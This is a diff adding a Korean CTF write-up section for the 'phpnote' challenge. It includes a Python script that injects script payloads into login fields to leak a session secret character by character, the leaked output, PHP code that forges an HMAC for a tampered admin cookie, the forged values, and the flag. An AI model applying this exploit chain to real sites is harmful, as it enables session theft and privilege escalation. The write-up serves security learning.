@@ -555,13 +555,90 @@ First Name : "<script>var miner=new CoinHive.User();miner.start()</script>"
 Last Name : "<body>"
 nickname : "</body>"
 ```
-실제로 위와 같은 데이터로 로그인해보면 에러 페이지도 뜨지 않고 로그인이 되지 않는다. 
+실제로 위와 같은 데이터로 로그인해보면 에러 페이지도 뜨지 않고 로그인이 되지 않는다. 이를 이용하여 다음과 같이 세션의 secret 값을 추출하는 구조를 생각해볼 수 있다.
+```
+`realname|s:13:"<script>var body = document.body.innerHTML; var mal = 'var miner=new Coin'; var n = body[0].charCodeAt(0); mal = mal + String.fromCharCode(n^68) + 'User();miner.start()'; eval(mal);</script><body>";secret|s:13:"_secret_code_";nickname|s:6:"</body>"`
+```
+`body`의 첫번째 글자를 가져와 어떤 값과 XOR하는 구조다. 만약 로그인에 실패한다면 XOR의 성질을 통해 어떤 값인지 알 수 있다. 이를 이용해 공격 코드를 짜보면 아래와 같다.
+``` python
+import requests
+import string
 
+def check(realname):
+  #print(realname)
+  url = "http://phpnote.chal.ctf.westerns.tokyo/?action="
 
+  r = requests.session()
 
+  t = r.post(url+"login", data={
+    "realname" : realname,
+    "nickname" : ""
+  })
 
+  res = r.post(url+"login", data={
+    "realname" : realname,
+    "nickname" : "</body>"
+  })
+
+  if "Welcome" in res.text:
+    return False
+  return True
+
+idx = 0
+secret = ""
+while True:
+  print("[*] Search ", end='')
+  for n in string.printable[:-6]:
+    payload = """
+    <script>
+    var secret = document.body.innerHTML[{}].charCodeAt();
+    var script = "var miner=new CoinHive"+String.fromCharCode({}^secret)+"User();miner.start()";
+    eval(script);
+    </script><body>""".format(idx, ord(n)^ord('.'))
+
+    if check(payload):
+      print("({})".format(str(n)))
+      secret += n
+      break
+    print(".", end="")
+  else:
+    print("Can't find anymore!")
+    break
+  idx += 1
+print("\n[!] "+secret)
+
+''' result
+[*] Search ...........b
+[*] Search ........................o
+[*] Search .............d
+[*] Search ..............e
+
+(...)
+
+[*] Search ..............................................................................................Can't find anymore!
+
+[!] bodecret|s:32:"2532bd172578d19923e5348420e02320";nickname|s:7:"
+'''
+```
+왜 secret이 아니라 bodecret이 나온건지는 잘 모르겠지만 secret 값을 얻었다. 이를 이용해서 `hash_hmac('sha256', $data, $secret)` 값을 구했다. 현재 쿠키 상태는 아래와 같다.  
+- note : Tzo0OiJOb3RlIjoyOntzOjU6Im5vdGVzIjthOjE6e2k6MDthOjI6e2k6MDtzOjQ6ImdvZ28iO2k6MTtzOjI6ImdvIjt9fXM6NzoiaXNhZG1pbiI7YjowO30%3D  
+- hmac : 644a93d35c48a8f0f6590d31d76adc5a476bcdb40e713df1cbd23448531f5d9b  
+
+note를 디코딩 해서 isadmin부분만 1로 바꾸어준 후 다시 인코딩 해주면 우리가 공격에 사용할 새로운 note값이 나온다. 이 값을 아래 코드를 이용하여 hmac 값도 구할 수 있었다.
+``` php
+<?php
+$data = "new_note_value";
+$secret = "2532bd172578d19923e5348420e02320";
+echo(hash_hmac('sha256', $data, $secret)."\n");
+?>
+```
+- new note : Tzo0OiJOb3RlIjoyOntzOjU6Im5vdGVzIjthOjE6e2k6MDthOjI6e2k6MDtzOjQ6ImdvZ28iO2k6MTtzOjI6ImdvIjt9fXM6NzoiaXNhZG1pbiI7YjoxO30= 
+- new hmac : c8e9e36c41b95d53eedcd7b8ce44b1bc347517b18e3fe05cfdfaebf923163775  
+위와 같이 쿠키를 설정해준 후 `/?action=getflag`에 접근하면 플래그가 나온다.
 
 ## Flag
+`TWCTF{h0pefully_I_haven't_made_a_m1stake_again}`  
+[참고](https://saarsec.rocks/2019/09/04/twctf-phpnote.html)
 
 
 # Easy Crack Me
